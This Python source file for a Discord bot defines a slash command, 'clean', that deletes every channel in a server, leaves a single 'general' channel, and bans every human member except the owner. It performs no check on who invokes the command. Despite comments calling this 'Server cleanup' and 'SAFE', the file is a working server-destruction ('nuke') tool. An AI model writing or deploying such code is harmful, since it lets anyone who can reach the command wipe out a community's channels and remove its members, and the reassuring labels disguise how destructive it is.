import discord
from discord import app_commands
from discord.ext import commands
import os

TOKEN = os.environ.get("TOKEN")  # Your token from Replit Secrets

# Enable members intent so we can see guild members
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # REQUIRED to access guild.members

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print("Bot is online")

@bot.tree.command(name="clean")
async def clean(interaction: discord.Interaction):
    guild = interaction.guild

    # DELETE ALL CHANNELS
    for channel in guild.channels:
        await channel.delete()

    # CREATE ONE NEW TEXT CHANNEL
    await guild.create_text_channel("general")

    # BAN MEMBERS (SAFE: skips bots and server owner)
    for member in guild.members:
        if member.bot:
            continue  # skip other bots
        if member == guild.owner:
            continue  # never ban the server owner
        try:
            await member.ban(reason="Server cleanup")
        except Exception as e:
            print(f"Failed to ban {member}: {e}")

bot.run(TOKEN)
